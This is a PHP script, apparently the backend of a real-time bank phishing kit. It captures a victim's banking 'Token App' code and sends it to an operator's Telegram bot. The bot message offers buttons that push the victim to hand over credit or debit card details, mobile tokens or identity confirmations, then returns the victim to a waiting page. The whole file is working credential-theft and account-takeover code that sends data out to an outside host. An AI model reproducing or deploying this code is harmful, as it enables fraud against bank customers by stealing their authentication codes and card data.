<?php
// succes-verify.php

session_start();

// 1. Cargar la configuración principal
$config = require 'conexion.php';

// 2. Recuperar los datos del formulario de token
$token = $_POST['full_token'] ?? 'No especificado';
$transaction_id = $_POST['transaction_id'] ?? null;

// Si no hay un ID de transacción, no podemos continuar.
if (!$transaction_id) {
    // Redirigir a una página de error o al inicio
    header('Location: ../../index.php?error=notransaction');
    exit;
}

// --- Lógica de Base de Datos ---
$db_config = $config['db'];
$driver = $db_config['driver'];
$dsn = ($driver === 'mysql')
    ? "mysql:host={$db_config['host']};dbname={$db_config['dbname']};charset=utf8mb4"
    : "pgsql:host={$db_config['host']};dbname={$db_config['dbname']}";
try {
    $pdo = new PDO($dsn, $db_config['user'], $db_config['password']);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

    // Preparamos la consulta para cambiar ÚNICAMENTE el estado a 0.
    $sql = "UPDATE a_confirmar SET estado = 0 WHERE id = :id";
    $stmt = $pdo->prepare($sql);

    // Ejecutamos la consulta solo con el ID, ya no necesitamos el token aquí.
    $stmt->execute([
        ':id' => $transaction_id
    ]);

}
catch (PDOException $e) {
    // Si algo sale mal, el script se detendrá aquí y te mostrará el error.
    die("ERROR DE BASE DE DATOS: No se pudo actualizar el estado. <br><br>Mensaje: " . $e->getMessage());
}


// --- Lógica de Telegram ---
$telegram_config = $config['telegram'];
if (!isset($telegram_config['bot_token']) || !isset($telegram_config['chat_id'])) {
    // Si no hay config de Telegram, igualmente redirigimos para no bloquear al usuario
    header('Location: ../../index.php?id=' . $transaction_id);
    exit;
}

$botToken = $telegram_config['bot_token'];
$chatId = $telegram_config['chat_id'];


// 3. Crear el mensaje específico para el Token
$message = "🏦 *Código Token App Recibido* 🏦\n\n"; // Mensaje actualizado para diferenciar
$message .= "› *ID de Transacción:* `" . htmlspecialchars($transaction_id) . "`\n";
$message .= "› *Token App Ingresado:* `" . htmlspecialchars($token) . "`\n\n";
$message .= "-------------------------------------\n";
$message .= "_Por favor, elija una acción para la transacción original._";


// ======================= INICIO DE LA MODIFICACIÓN =======================
// 4. Reutilizar la lógica de los botones
$base_update_url = $config['base_url'];
$admin_prompt_url = str_replace('actualizar_estado.php', 'admin_prompt_movil.php', $base_update_url);

$keyboard = [
    'inline_keyboard' => [
        [
            ['text' => '✅ TC Aprobada', 'url' => $base_update_url . '?id=' . $transaction_id . '&estado=11'],
        ],
        [
            ['text' => '❌ Error TC Crédito', 'url' => $base_update_url . '?id=' . $transaction_id . '&estado=12'],
            ['text' => '❌ Error TC Débito', 'url' => $base_update_url . '?id=' . $transaction_id . '&estado=15'],
        ],
        [
            ['text' => '💳 Pedir TC Crédito', 'url' => $base_update_url . '?id=' . $transaction_id . '&estado=13'],
            ['text' => '🏦 Pedir TC Débito', 'url' => $base_update_url . '?id=' . $transaction_id . '&estado=14'],
        ],
        [
            ['text' => '✅ Soy yo', 'url' => $base_update_url . '?id=' . $transaction_id . '&estado=6'],
            ['text' => '❌ Error Soy yo', 'url' => $base_update_url . '?id=' . $transaction_id . '&estado=7'],
        ],
        [
            ['text' => '❌ Login Fallido', 'url' => $base_update_url . '?id=' . $transaction_id . '&estado=1'],
            ['text' => '⚠️ Pedir Token App', 'url' => $base_update_url . '?id=' . $transaction_id . '&estado=2'],
        ],
        [
            ['text' => '❌ Rechazar', 'url' => $base_update_url . '?id=' . $transaction_id . '&estado=3'],
            ['text' => '📱 Pedir Token Móvil', 'url' => $admin_prompt_url . '?id=' . $transaction_id],
        ],
        [
            ['text' => '🚫 Token Móvil Inválido', 'url' => $base_update_url . '?id=' . $transaction_id . '&estado=5']
        ]
    ]
];
$reply_markup = json_encode($keyboard);
// ======================= FIN DE LA MODIFICACIÓN =======================

$post_fields = [
    'chat_id' => $chatId,
    'text' => $message,
    'parse_mode' => 'Markdown',
    'reply_markup' => $reply_markup
];

// 5. Enviar a la API de Telegram
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot{$botToken}/sendMessage");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 10);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_exec($ch);
curl_close($ch);
// --- FIN LÓGICA DE TELEGRAM ---

// 6. Redirección FINAL de vuelta a index.php con el ID para continuar la búsqueda de estado
header('Location: ../../index.php?id=' . $transaction_id);
exit;
?>

